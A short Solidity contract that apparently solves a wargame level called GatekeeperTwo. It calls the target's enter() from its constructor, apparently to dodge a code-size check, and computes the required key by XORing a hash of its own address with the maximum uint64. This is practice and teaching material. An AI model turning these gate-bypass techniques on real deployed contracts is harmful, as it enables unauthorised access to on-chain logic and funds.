// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract EnterGateTwo {
    constructor(address targetAddress) {
        GatekeeperTwo gate = GatekeeperTwo(targetAddress);
        bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gate.enter(key);
    }
}
